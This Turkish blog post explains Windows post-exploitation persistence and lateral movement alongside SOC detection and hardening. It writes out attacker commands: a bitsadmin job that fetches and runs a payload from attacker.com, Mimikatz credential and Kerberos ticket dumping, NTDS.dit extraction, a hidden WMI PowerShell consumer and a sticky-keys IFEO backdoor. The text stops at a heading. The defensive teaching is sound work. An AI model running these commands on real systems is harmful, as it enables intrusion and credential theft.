---
title: Windows'ta Sızma Sonrası
date: 2024-11-18
draft: false
description: Bir saldırganın Initial Access sonrasında sisteme nasıl tutunduğunu (Persistence) ve ağda nasıl yayıldığını (Lateral Movement) inceleyen kapsamlı güvenlik rehberi. WMI, COM Hijacking, IFEO, Kerberos saldırıları, SOC tespiti ve sıkılaştırma adımlarını içerir.
image: featured.webp
type: posts
topic: detection-response
tags: ["Windows", "Persistence", "Registry", "WMI", "MITRE ATT&CK", "Threat Hunting"]
featuredImageAlt: "Mavi ve kırmızı iki yarıya bölünmüş, devre hatlarından oluşan Windows logosu"
---

Bir saldırgan hedef sisteme ilk erişimi (Initial Access) sağladığında gerçek mücadele yeni başlar. Kimlik avı e-postası tıklandı, zafiyet istismar edildi ya da VPN kimlik bilgisi ele geçirildi — ama bu yalnızca kapıdan girmektir. Asıl hedef: **fark edilmeden kalmak, köklü bir yer edinmek ve ağın derinliklerine yayılmaktır.**

Bu yazıda bir saldırganın gözünden sızma sonrası dönemi kronolojik olarak inceliyoruz:

1. **Kalıcılık (Persistence):** Sistem yeniden başlatılsa, şifre değiştirilse bile varlığını sürdürmek.
2. **Yatay Hareket (Lateral Movement):** İlk ele geçirilen makineden kritik sunuculara, Domain Controller'a sıçramak.
3. **Tespit (Detection):** Blue Team'in bu zinciri nasıl kırabileceği.
4. **Sıkılaştırma (Hardening):** Önleyici savunma adımları.

> Bu yapı MITRE ATT&CK Enterprise Matrix'in **TA0003 (Persistence)** ve **TA0008 (Lateral Movement)** taktikleriyle birebir örtüşmektedir. Kalıcılık tarafında özellikle `T1547: Boot or Logon Autostart Execution` ve `T1112: Modify Registry` teknikleri, bir SOC analistinin en sık karşılaştığı registry tabanlı yöntemlerdir.

Kalıcılık, bir saldırının kısa süreli bir olaydan uzun soluklu bir sızma operasyonuna dönüşmesinde belirleyici aşamadır. Tehdit aktörüne Komuta ve Kontrol (C2) sunucularıyla konuşacak bir arka kapı, geleneksel güvenlik kontrollerini atlatma imkânı ve ağ içinde ayrıcalık yükseltme ile yatay hareket için sağlam bir zemin sağlar.

---

## Windows Sistemlerde Kalıcılık (Persistence) Mekanizmaları

Kalıcılık yöntemleri, bir sistemin yeniden başlatılması veya kullanıcı oturumunun kapatılması durumunda bile zararlı yazılımların veya yetkisiz erişimlerin devam etmesini sağlar. Saldırganlar bu aşamada mümkün olduğunca sessiz olmayı tercih eder: antivirüs atlatılmalı, log kayıtları minimum düzeyde tutulmalı, meşru sistem araçlarıyla iç içe geçilmelidir.

### Kullanıcı Manipülasyonu

Saldırganlar Administrator hesabını ele geçirdiğinde, bu hesabın faaliyetleri izlendiği için doğrudan kullanmak yerine yeni ve "sıradan görünen" kullanıcılar oluştururlar. Bu kullanıcılar genellikle `support`, `sysadmin`, `helpdesk` gibi adlar taşır — SOC ekibinin radarına girme ihtimali düşüktür.

```cmd
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
```

Mevcut kullanıcıları listelemek için:

```cmd
net users
```

![Yeni kullanıcı oluşturma ve yerel yönetici grubuna ekleme komutları](1_HvOGzRb3pHx18C05BL9HYg.webp)

**SOC Tespiti — Event ID'leri:**

| Event ID | Anlam |
|----------|-------|
| 4720 | Yeni kullanıcı hesabı oluşturuldu |
| 4726 | Kullanıcı hesabı silindi |
| 4732 | Kullanıcı bir gruba eklendi (Administrators gibi) |

Event Viewer → Windows Logs → Security üzerinden bu Event ID'leri filtreleyerek iz sürülebilir.

![Event Viewer Security günlüğünde 4720 hesap oluşturma olayının filtrelenmesi](1_4nn-RZO_QOj2Z31N2iW__Q.webp)

![Güvenlik günlüğü detayında yeni hesap oluşturma olayı analizi](1_1xVpZh22clB0-MLj_t8dfA.webp)

### Zamanlanmış Görevler (Scheduled Tasks)

Fidye yazılımlarından APT gruplarına kadar kalıcılık için en yaygın kullanılan yöntemlerden biridir. Saldırgan, zararlı dosyanın belirli aralıklarla ya da sistem açılışında çalışmasını sağlar.

```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru SYSTEM
```

Sysinternals **Autoruns** aracı, zamanlanmış görevleri imza doğrulamasıyla birlikte listeler. Microsoft imzalı olmayan görevler kırmızı ile işaretlenir.

![Sysinternals Autoruns üzerinde zamanlanmış görevlerin dijital imza doğrulaması](1_idpBPfOpk5jfDLg-y3C8wA.webp)

**SOC Tespiti:**
- Event ID **4698**: Yeni zamanlanmış görev oluşturuldu
- Autoruns → Scheduled Tasks sekmesi

### Kayıt Defteri Çalıştırma Anahtarları (Registry Run Keys)

Registry Run key'leri, Windows'un meşru bir özelliğidir, sistem açılışında veya kullanıcı oturum açtığında belirtilen programları otomatik çalıştırır. MITRE ATT&CK verilerine göre **T1547.001** tekniği, 54'ten fazla bilinen tehdit grubu tarafından kullanılmaktadır.

**Temel Run Anahtarları:**

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Startup Klasörü Yönlendirme Anahtarları:**

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserShellFolders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellFolders
```

**İleri Düzey Anahtarlar (APT'lerin Tercihi):**

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost   ← APT41 kullandı
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

**Anahtarların Anlamı ve Önemi:**

- `HKCU\...\Run`: Yalnızca ilgili kullanıcı oturum açtığında çalışır. `RunOnce` ise programı bir kez çalıştırır ve ardından girdiyi otomatik siler.
- `HKLM\...\Run`: Kullanıcıdan bağımsız olarak sistemdeki tüm kullanıcılar için çalışır. Bu anahtara yazmak genellikle `SYSTEM` veya `Administrator` ayrıcalığı gerektirir, burada beklenmedik bir girdi görmek, saldırganın sistemde daha derin bir erişime ulaştığının göstergesi olabilir.
- `Winlogon\Userinit`: Kullanıcı oturumu başlamadan önce çalışan programı referans alır. Saldırganlar meşru `userinit.exe`'den önce veya onun yerine kendi arka kapılarını çalıştırmak için bu değeri manipüle eder.
- `Explorer\User Shell Folders`: "Başlangıç" gibi kabuk klasörlerinin konumunu belirler. Değer değiştirilerek Startup klasörü saldırganın kontrolündeki bir dizine yönlendirilebilir.
- `Policies\Explorer\Run`: Grup İlkesi (Group Policy) üzerinden otomatik başlatma tanımlamak için kullanılır ve aynı şekilde istismar edilebilir.
- `Svchost`: Daha az bilinen bu sistem anahtarı, standart Run anahtarlarının ötesinde yaratıcı yollar arayan ileri seviye aktörlerin hedefidir.

Bu tekniğin bu kadar yaygın olmasının nedeni, Windows'un meşru bir özelliği olması ve bu yüzden geleneksel güvenlik çözümlerince kolayca gözden kaçırılabilmesidir. Yüksek başarı oranı ve düşük tespit riski, bir SOC analisti için tehdit avına başlarken ilk bakılacak yerin bu anahtarlar olduğunu gösterir.

#### Gerçek Dünya Örnekleri

| Tehdit | Kullanılan Anahtar | Davranış |
|--------|--------------------|----------|
| **Emotet Trojan** | `HKCU\...\Run` | `%AppData%` altına bıraktığı zararlı DLL'e işaret eden bir Run girdisi ekler, her oturum açılışında yeniden çalışır. |
| **APT28 (Fancy Bear)** | `Winlogon\Userinit` | Meşru süreçler başlamadan önce arka kapı yükler, sistem açılış zincirinin kritik bir noktasını hedefleyen sofistike bir yaklaşımdır. |
| **APT41** | `Windows NT\CurrentVersion\Svchost` | Cobalt Strike kalıcılığı için bu anahtarı değiştirmiştir. Windows'un iç işleyişine derin hâkimiyetin göstergesidir. |

Aşağıdaki tablo, en sık karşılaşılan registry kalıcılık anahtarlarını, etkilerini ve ilgili tehdit örneklerini özetleyen hızlı bir başvuru kılavuzudur:

![En sık karşılaşılan registry kalıcılık anahtarları, etkileri ve tehdit örnekleri başvuru tablosu](1_EOdZ-x8gqkMWMCJo5HLhqg.webp)

Registry değişikliklerini görselleştirmek için `regedit` veya Autoruns kullanılabilir:

![Kayıt defteri Run anahtarlarının Regedit ve Autoruns ile incelenmesi](1_KJ7xCp0G-BiHtQ1-wsCjBw.webp)

![Run ve RunOnce kayıt defteri anahtarlarının detaylı görünümü](1_y3d5O0LdaV4GmOdbHnHpng.webp)

![Kayıt defteri değişikliklerinde tetiklenen güvenlik denetim kayıtları](1_Z-1VEztRVjoi7huNxW_u3A.webp)

**SOC Tespiti:**
- Event ID **4657**: Registry değeri değiştirildi/oluşturuldu (Auditing etkin olmalı)
- Sysmon Event ID **12** (anahtar oluşturma/silme) ve **13** (değer değişikliği)

### Startup Klasörü

```
C:\Users\[Kullanıcı]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Çalıştır (Win+R) → `shell:startup` ile erişilebilir:

![Windows başlangıç (Startup) klasörünün dosya sistemindeki konumu](1_1VKN6kfhHUHtAxIC_SMn-g.webp)

![Kullanıcı başlangıç klasörüne yerleştirilen yürütülebilir dosyalar](1_wYEoJlBvJhUvXomYDotB-g.webp)

### Windows Servisleri

Saldırganlar `sc create` komutuyla meşru isimler taşıyan (ör. `ChromeUpdateService`) yeni servisler oluşturabilir veya mevcut servisleri ele geçirebilir.

```cmd
sc create "ChromeUpdateService" binPath= "C:\Users\Public\payload.exe" start= auto
sc start "ChromeUpdateService"
```

**SOC Tespiti:**
- Event ID **4697**: Sisteme yeni servis yüklendi
- Autoruns → Services sekmesi

### BITS Jobs (Background Intelligent Transfer Service)

BITS, Windows'un dosya transfer altyapısıdır, güvenlik duvarları tarafından genellikle engellenmez. Saldırganlar BITS üzerinden dosya indirip çalıştırabilir ve güvenlik araçlarının radarından kaçabilir.

```cmd
bitsadmin /create /download MalJob
bitsadmin /addfile MalJob http://attacker.com/payload.exe C:\Users\Public\payload.exe
bitsadmin /SetNotifyCmdLine MalJob C:\Users\Public\payload.exe NULL
bitsadmin /resume MalJob
```

**Tespiti:** `bitsadmin /list /verbose` veya Sysmon süreç yaratma logları.

### WMI Event Subscriptions — Disksiz (Fileless) Kalıcılık

WMI (Windows Management Instrumentation), gelişmiş tehdit aktörlerinin disk üzerinde iz bırakmadan kalıcılık sağladığı en sofistike yöntemlerden biridir. Payload registry ve WMI veritabanında saklanır, geleneksel antivirüs taramaları dosya sistemi odaklı olduğundan bu tekniği genellikle atlayabilir.

**Üç bileşen birlikte çalışır:**

1. **Filter (Filtre):** Tetikleyici olay — ör. sistem açılışı
2. **Consumer (Tüketici):** Çalıştırılacak komut/script
3. **Binding (Bağlayıcı):** Filtre ile Consumer'ı ilişkilendirir

```powershell
# Filter: sistem her başladığında tetikle
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = "WindowsUpdateFilter"
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.EventNamespace = "root\cimv2"
$filter.Put()

# Consumer: PowerShell komutu çalıştır
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "WindowsUpdateConsumer"
$consumer.CommandLineTemplate = "powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>"
$consumer.Put()

# Binding
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.__PATH
$binding.Consumer = $consumer.__PATH
$binding.Put()
```

**SOC Tespiti:**
- Sysmon Event ID **19** (WmiEventFilter), **20** (WmiEventConsumer), **21** (WmiEventConsumerToFilter)
- PowerShell script block logging etkinleştirilmişse Event ID **4104**
- `Get-WMIObject -Namespace root\subscription -Class __EventFilter` ile manuel sorgu

### COM Hijacking

COM (Component Object Model), Windows uygulamalarının birbirleriyle iletişim kurduğu bir altyapıdır. Her COM nesnesi registry'de bir CLSID ile kayıtlıdır. Saldırganlar `HKCU\Software\Classes\CLSID` altına meşru bir COM nesnesinin CLSID'ini kopyalayarak kendi kötü amaçlı DLL'lerini yükletebilir — bunu yapmak için yönetici yetkisi bile gerekmez.

```
# Meşru kayıt (HKLM - değiştirilemez):
HKLM\Software\Classes\CLSID\{XXXXXXXX-...}\InprocServer32 → C:\Windows\System32\legitimate.dll

# Saldırgan kayıt (HKCU - kullanıcı yetkisiyle yazılabilir):
HKCU\Software\Classes\CLSID\{XXXXXXXX-...}\InprocServer32 → C:\Users\Public\evil.dll
```

Windows, HKCU'yu HKLM'den önce kontrol ettiği için kötü amaçlı DLL yüklenir. `explorer.exe` gibi sık yeniden başlatılan süreçlerin COM nesneleri bu saldırı için ideal hedeflerdir.

**Tespit:** Sysmon Event ID **7** (Image Load) — meşru süreçlerin `C:\Users\` yolundan DLL yüklemesi anomalidir.

### IFEO (Image File Execution Options) Enjeksiyonu

IFEO, geliştiricilerin bir uygulamayı başlatıldığında hata ayıklayıcıya bağlamasını sağlar. Saldırganlar bu mekanizmayı, engellilik kısayol tuşlarına bağlı sistem uygulamalarının (sethc.exe — Sticky Keys, utilman.exe — Erişilebilirlik) yerine kendi arka kapılarını çalıştırmak için kullanır. Bu yöntem özellikle dikkat çekicidir çünkü giriş ekranından, yani herhangi bir kullanıcı oturumu açmadan çalıştırılabilir.

```cmd
# HKLM gerektirir — SYSTEM/Admin yetkisiyle:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

Artık giriş ekranında Shift tuşuna 5 kez basıldığında `sethc.exe` yerine `cmd.exe` çalışır — sistem yetkisiyle.

**Tespit:**
- Sysmon Event ID **13**: IFEO registry anahtarına yazma
- Event ID **4688**: Olağandışı parent-child süreç ilişkisi (sethc.exe → cmd.exe)

### DLL Search Order Hijacking / Sideloading

Windows bir DLL'i yüklerken belirli bir sırayla arama yapar: önce uygulamanın kendi dizini, sonra sistem dizinleri. Saldırganlar, meşru ve dijital imzalı bir uygulamanın çalıştığı dizine aynı isimde kötü amaçlı bir DLL yerleştirerek yasal süreçler aracılığıyla kod çalıştırabilir.

**Sideloading:** Özellikle güvenlik araçlarının veya antivirüs yazılımlarının kendi dizinlerine yerleştirilen sahte DLL'lerle gerçekleşir — güvenlik ürününün kendi ayrıcalıklarıyla çalışır.

```
C:\Program Files\LegitApp\
├── LegitApp.exe      (imzalı, meşru)
└── version.dll       (saldırganın eklediği kötü amaçlı DLL)
```

`LegitApp.exe` başlatıldığında önce kendi dizinine bakar ve `version.dll`'i bularak yükler.

**Tespit:** Sysmon Event ID **7** — imzasız veya beklenmedik yoldan DLL yüklenmesi.

---

## Kalıcılıktan Yatay Harekete — Köprü

### Saldırgan Neden Yerinde Durmaz?

Saldırgan ilk makineyi ele geçirdiğinde bu genellikle bir son kullanıcı iş istasyonudur: sınırlı erişim, sınırlı veri, sınırlı etki. Gerçek hedef ağdaki kritik varlıklardır:

- **Domain Controller (DC):** Tüm Active Directory kimlik bilgileri, Group Policy kontrolü, NTDS.dit veritabanı
- **Dosya Sunucuları:** Hassas belgeler, kaynak kodları
- **Yedekleme Sunucuları:** Veri şifreleme (ransomware) için ideal hedef
- **SIEM/Log Sunucuları:** İzlerin silinmesi

### Active Directory: Saldırganın Altın Madeni

Kurumsal ağların büyük çoğunluğu Active Directory (AD) altyapısı üzerinde çalışır. AD, merkezi kimlik yönetimi sağlar, bu da onu hem saldırganlar için birincil hedef, hem de bir kez ele geçirildiğinde tüm ağın kapılarını açan bir "master key" haline getirir.

**Credential Harvesting — Kimlik Bilgisi Toplama:**

İlk makinede kalıcılık sağlandıktan sonra saldırgan kimlik bilgilerini toplamaya başlar:

```cmd
# Mimikatz ile LSASS belleğinden credential dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# NTDS.dit üzerinden tüm domain hash'lerini çıkarma (DC'de)
ntdsutil "ac in ntds" "ifm" "create full C:\temp" q q
```

Bu noktadan itibaren saldırgan elindeki kimlik bilgileri ve hash'lerle yatay harekete geçmeye hazırdır.

---

## Ağ İçinde Yatay Hareket (Lateral Movement)

Yatay hareket, saldırganın ağ içindeki diğer sistemlere erişim sağlaması sürecidir. Bir APT grubunun lateral movement aşamasında ortalama süre, kurumsal ağlarda **4-5 gün** olmakla birlikte bu süre bazen haftalara uzayabilir. Saldırganlar bu süreçte mümkün olduğunca "gürültüsüz" çalışmayı, meşru araçları kullanmayı (Living off the Land — LotL) ve normal trafik içinde eriyip gitmeyi hedefler.

### RDP (Remote Desktop Protocol) — APT'lerin Favorisi

RDP, Microsoft'un uzak masaüstü bağlantı protokolüdür ve port **3389** üzerinden çalışır. APT gruplarının lateral movement aracısı olarak en sık kullandığı protokoldür, bunun ana nedeni RDP'nin kurumsal ağlarda zaten yaygın olmasıdır — normal trafik içinde kaybolur.

![RDP protokol mimarisi ve uzak masaüstü oturum akışı](1__XjdN0sbwr04IpjBK0mVcA.webp)

**RDP'nin Temel Özellikleri:**
1. **Uzaktan Erişim:** Tam masaüstü kontrolü
2. **TLS Şifreleme:** Güvenli veri iletimi (eski sürümlerde zafiyetler mevcut — BlueKeep, CVE-2019-0708)
3. **Kerberos Entegrasyonu:** AD ortamında kimlik doğrulama Kerberos protokolü üzerinden yapılır
4. **Erişim Denetimi ve MFA:** Yöneticiler uzak erişimi denetleyebilir, oturum açmaya çok faktörlü kimlik doğrulama (MFA) entegre edilebilir

> MFA, TLS ve erişim denetimi gibi mekanizmalar varken RDP aslında güvenli bir protokoldür. Asıl sorun bu mekanizmaların gerçekten kullanılıp kullanılmadığı ve doğru yapılandırılıp yapılandırılmadığıdır.

**RDP'nin Güvenlik Riskleri:**
- **Zayıf Şifreler ve Kaba Kuvvet:** Zayıf veya varsayılan şifreler, uzak sistemlere yetkisiz erişimin en kısa yoludur.
- **İnternete Açık 3389 Portu:** Doğrudan internetten erişilebilen RDP, port taramalarıyla kolayca bulunur ve hedef alınır.
- **Bilinen Zafiyetler:** BlueKeep gibi geçmiş açıklar, yamasız sistemlere doğrudan sızma imkânı verir.

![RDP ile ağ içinde yanal hareket akışı](1_XsWJxISsqgpXS_I2ecBx9g.webp)

**APT'lerin RDP ile Lateral Movement Yöntemleri:**

- **Pass-the-Hash (PtH):** NTLM hash'i kullanarak şifresiz kimlik doğrulama
- **Credential Dumping:** Mimikatz ile LSASS belleğinden kimlik bilgisi çalma
- **Brute-Force:** Zayıf RDP şifrelerini kaba kuvvetle kırma

> **Önemli Not:** Bu saldırıların gerçekleşmesi doğrudan RDP'yi suçlu kılmaz. Pass-the-Hash, Kerberos protokolünün stateless yapısından. Credential Dumping ise Windows'un LSASS sürecinin bellek yönetiminden kaynaklanır. RDP yalnızca bu saldırıların vektörüdür.

**APT Örnekleri:**
- **APT33 (İran):** RDP üzerinden lateral movement + credential theft
- **APT29 (Cozy Bear / Rusya):** Ele geçirilmiş RDP oturumlarıyla iç ağda yayılma

**APT'ler RDP'yi Neden Tercih Ediyor?**
1. **Kolay Erişim ve Yayılma:** Sızdıktan sonra farklı cihazlara geçişi kolaylaştırır, geniş ağlarda kritik bir avantajdır.
2. **Hızlı Veri Erişimi:** Önemli verilere ve sistem kaynaklarına hızla ulaşmayı sağlar, uzun süreli, düşük profilli operasyonlar için idealdir.
3. **Yaygınlık ve Yapılandırma Hataları:** Çoğu kurumda zaten kullanıldığı için trafik normal görünür, güvenlik önlemleri ise çoğu zaman eksiktir.

#### Tek Sorun RDP mi? TeamViewer ve AnyDesk

RDP'nin APT saldırılarındaki popülerliği, aslında kurumlardaki kullanım yaygınlığından gelir. Aynı risk diğer popüler uzaktan erişim araçları için de geçerlidir:

- **TeamViewer:** Sistem yöneticilerinin sık kullandığı bu araç, APT grupları tarafından hedef bilgisayarlara bağlanmak için kötüye kullanılabilir. Kurulu ve çalışır durumda olması çoğu zaman fark edilmez, sosyal mühendislikle hedef makineye kurdurulması saldırgana gizli bir erişim kanalı açar.
- **AnyDesk:** Hızlı bağlantı ve yüksek performansı nedeniyle tercih edilir. İş amaçlı meşru kullanım yaygın olduğu için kötü amaçlı kullanım kolayca gözden kaçabilir. Geçmişte AnyDesk'te ortaya çıkan bir güvenlik açığı nedeniyle birçok kurumun ele geçirilmesi, bu araçların riskini açıkça göstermiştir.

> Suçlu RDP değil, tüm uzaktan erişim araçları benzer riskleri taşır. Bu nedenle envanterdeki her uzaktan erişim aracı (RMM yazılımları dahil) izlenmeli, onaysız kurulumlar alarm üretmelidir.

### WinRM & PowerShell Remoting — Living off the Land

Windows Remote Management (WinRM), Windows'un yerleşik uzaktan yönetim protokolüdür ve portlar **5985** (HTTP) ve **5986** (HTTPS) üzerinden çalışır. Sistem yöneticilerinin günlük yönetim için kullandığı bu altyapı, saldırganların "arazi üzerinde yaşama" (Living off the Land — LotL) taktiği için birebir uygundur.

```powershell
# Hedef sisteme PowerShell Remoting ile bağlan
Enter-PSSession -ComputerName hedef-sunucu -Credential $cred

# Uzak sistemde komut çalıştır
Invoke-Command -ComputerName hedef-sunucu -ScriptBlock { whoami; ipconfig }

# Birden fazla sisteme paralel komut
Invoke-Command -ComputerName dc01, web01, db01 -ScriptBlock { Get-Process }
```

**Neden tehlikelidir?**
- `powershell.exe` ve `wsmprovhost.exe` gibi tamamen meşru Windows süreçleri kullanılır
- Trafik WinRM üzerinden şifreli geçer
- Birçok EDR çözümü PowerShell Remoting'i varsayılan olarak beyaz listeye alır

**SOC Tespiti:**
- Event ID **4624** (Type 3 — Network Logon): Uzak sisteme oturum açma
- Event ID **4688**: `wsmprovhost.exe` süreç oluşturma
- Sysmon Event ID **3**: 5985/5986 portuna giden ağ bağlantısı
- PowerShell Script Block Logging (Event ID 4104)

### SMB Share ve PsExec — Klasik Ama Etkili

SMB (Server Message Block), Windows'un dosya paylaşım protokolüdür (port **445**). Saldırganlar özellikle yönetici paylaşımları olan `ADMIN$` ve `C$` üzerinden lateral movement gerçekleştirir.

```cmd
# Uzak sisteme yönetici paylaşımı üzerinden bağlan
net use \\hedef-ip\ADMIN$ /user:DOMAIN\Administrator password

# Dosya kopyala
copy payload.exe \\hedef-ip\ADMIN$\payload.exe

# PsExec ile uzak sistemde komut çalıştır
PsExec.exe \\hedef-ip -u DOMAIN\Administrator -p password cmd.exe
```

**PsExec Nasıl Çalışır?**
1. `ADMIN$` paylaşımına `PSEXESVC.exe` servisini kopyalar
2. Hedef sistemde bu servisi başlatır
3. Named Pipe üzerinden komut/cevap iletişimi kurar
4. İşlem bitince servisi siler (ama izler kalır)

**SOC Tespiti:**
- Event ID **7045**: Yeni servis kurulumu (`PSEXESVC`)
- Event ID **4624** (Type 3): SMB kimlik doğrulaması
- Sysmon Event ID **1**: `PSEXESVC.exe` süreç oluşturma
- Sysmon Event ID **11**: `ADMIN$` paylaşımına dosya bırakma

### Kerberos İstismarları: PtT ve Overpass-the-Hash

Active Directory ortamlarında kimlik doğrulama Kerberos protokolüyle gerçekleşir. Kerberos'un "stateless" (durumsuz) mimarisi — yani bilet tabanlı çalışması — bazı kritik saldırı vektörlerine kapı açar.

**Kerberos Bilet Sistemi:**
- **TGT (Ticket Granting Ticket):** Kullanıcı giriş yaptığında KDC (Key Distribution Center) tarafından verilir
- **TGS (Ticket Granting Service):** Belirli servislere erişim için TGT ile talep edilir

#### Pass-the-Ticket (PtT)

Bellekten çalınan bir Kerberos bileti, başka bir sistemde kimlik doğrulama için kullanılabilir. Bilet geçerlilik süresi dolmadığı sürece (varsayılan 10 saat) şifre değiştirilse bile çalışır.

```cmd
# Mimikatz ile mevcut biletleri dök
mimikatz.exe "sekurlsa::tickets /export"

# Çalınan bileti mevcut oturuma enjekte et
mimikatz.exe "kerberos::ptt ticket.kirbi"

# Doğrula
klist
```

#### Overpass-the-Hash

NTLM hash'ini kullanarak Kerberos TGT bileti talep etme yöntemidir. Bu teknikle saldırgan, hash'i doğrudan NTLM kimlik doğrulamasında kullanmak yerine onu Kerberos biletiyle değiştirerek daha az iz bırakır.

```cmd
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<HASH> /run:cmd.exe"
```

Bu komut NTLM hash'iyle yeni bir oturum açar ve arka planda Kerberos TGT talep eder.

**Kerberos'un Stateless Yapısı ve RDP İlişkisi:**

RDP, AD ortamında kimlik doğrulama için Kerberos'u kullanır. Pass-the-Ticket saldırısında çalınan bilet doğrudan RDP oturumu açmak için kullanılabilir — çünkü Kerberos, biletin hangi makinede oluşturulduğunu takip etmez. Bu nedenle, Pass-the-Hash ile RDP lateral movement birleştiğinde görünen "suçlu" RDP'dir, ama gerçek zafiyet Kerberos'un tasarım felsefesindedir.

**SOC Tespiti:**
- Event ID **4768**: TGT talebi (AS-REQ)
- Event ID **4769**: TGS talebi (TGS-REQ) — aynı kullanıcıdan çok sayıda kısa süre içinde farklı servis talepleri anomalidir
- Event ID **4771**: Kerberos ön kimlik doğrulama başarısız

---

## Blue Team / SOC Perspektifinden Tespit ve Tehdit Avcılığı

### Tespit Felsefesi: Tek Log Yerine Anomali Zinciri

Bireysel log kayıtları çoğu zaman yanıltıcıdır. Meşru yazılımlar da Run anahtarlarını değiştirebilir, sistem yöneticileri de PsExec kullanır. Etkili tespit için **korelasyon** gereklidir: birden fazla olayı bir araya getirerek anlam çıkarmak.

> **Altın Kural:** Tek bir Event ID alarm değildir. Anomali zinciri alarmdir.

### Event ID Referans Tablosu

| Event ID | Kaynak | Anlam |
|----------|--------|-------|
| 4720 | Windows Security | Kullanıcı oluşturuldu |
| 4726 | Windows Security | Kullanıcı silindi |
| 4732 | Windows Security | Gruba üye eklendi |
| 4697 | Windows Security | Servis kuruldu |
| 4698 | Windows Security | Zamanlanmış görev oluşturuldu |
| 4624 (Type 3) | Windows Security | Ağ üzerinden oturum açma |
| 4624 (Type 10) | Windows Security | Uzak etkileşimli oturum (RDP) |
| 4657 | Windows Security | Registry değeri değiştirildi |
| 4768 | Windows Security | Kerberos TGT talebi |
| 4769 | Windows Security | Kerberos TGS talebi |
| 1 | Sysmon | Süreç oluşturma |
| 3 | Sysmon | Ağ bağlantısı |
| 7 | Sysmon | DLL yükleme |
| 11 | Sysmon | Dosya oluşturma |
| 12/13 | Sysmon | Registry oluşturma/değişiklik |
| 19/20/21 | Sysmon | WMI Event aboneliği |

### Event ID 4657 Analizi: Dört Kritik Alan

Registry değişikliklerini izlemenin en temel yerel kaynağı Event ID **4657**'dir: bir registry değerinin oluşturulduğunu, değiştirildiğini veya silindiğini kaydeder. Bu olayın üretilebilmesi için ilgili anahtarlarda denetim (auditing / SACL) politikasının önceden etkinleştirilmiş olması gerekir. Analistin incelemesi gereken dört ana alan:

| Alan | İçerik | Neye Bakılmalı? |
|------|--------|-----------------|
| **Subject (Konu)** | `Security ID`, `Account Name`, `Logon ID` | Normalde bu değişikliği yapmaması gereken bir hesap (`Guest` veya sıradan bir kullanıcı) şüphelidir. |
| **Object (Nesne)** | `Object Name` (anahtar yolu), `Object Value Name` | `Run`, `RunOnce`, `Userinit` gibi bilinen kalıcılık konumları. |
| **Process Information** | `Process Name`, `Process ID` | `powershell.exe`, `cmd.exe`, `reg.exe` gibi yönetim araçlarının yaptığı değişiklikler dikkatle incelenmelidir. |
| **Change Information** | `Old Value`, `New Value` | `C:\Users\Public\`, `C:\ProgramData\` gibi herkesin yazabildiği dizinlere işaret eden yollar güçlü bir tehdit göstergesidir. |

### Sysmon ile Derinlemesine Telemetri

Sysmon (System Monitor), Windows'un yerel log altyapısını önemli ölçüde zenginleştirir. Registry değişiklikleri için kritik event ID'ler:

- **Event ID 12** (RegistryEvent - Object create/delete): Yeni Run anahtarı oluşturulması
- **Event ID 13** (RegistryEvent - Value Set): Mevcut anahtar değerinin değiştirilmesi

Her Sysmon kaydı `ParentImage` ve `ParentCommandLine` alanlarını içerir — değişikliği kimin yaptığını ve bu sürecin nasıl başlatıldığını gösterir. Bu alan, saldırı zincirini geriye doğru takip etmek için kritiktir.

![Sysmon Event ID 13 kaydında ParentImage ve ParentCommandLine alanları](1_VR-A4gThQLNfdXDYlpGuwQ.webp)

### EDR/XDR Korelasyon Zinciri

EDR çözümleri uç noktalardaki registry, dosya sistemi, süreç ve ağ faaliyetlerini sürekli kaydeder, bu telemetri üzerinde davranışsal analiz, makine öğrenimi ve kural tabanlı motorlar çalıştırır. Örneğin alışılmadık bir konumdan çalışan bir yürütülebilir dosyanın kritik bir registry anahtarını değiştirmeye çalışması, yüksek öncelikli bir alarm tetikleyebilir.

XDR ise bu görünürlüğü ağ trafiği, e-posta, bulut ve kimlik verileriyle genişletir ve izole olayları bir saldırı hikayesine dönüştürür. Örnek bir persistence → C2 zinciri:

1. **İlk Erişim:** Phishing e-postası → `outlook.exe` → `powershell.exe` başlatma (Sysmon EID 1)
2. **Dosya Bırakma:** `C:\Users\Public\payload.exe` oluşturuldu (Sysmon EID 11)
3. **Kalıcılık:** `HKCU\...\Run` anahtarına yazıldı (Sysmon EID 13 / Windows EID 4657)
4. **C2 Bağlantısı:** Bilinmeyen IP:443'e bağlantı (Sysmon EID 3)

Bu korelasyon, tek bir registry değişikliği alarmını saldırının tüm adımlarını içeren yüksek güvenilirlikte bir olaya dönüştürür.

**Registry Değişikliklerini Diğer IOC'lerle İlişkilendirme:**
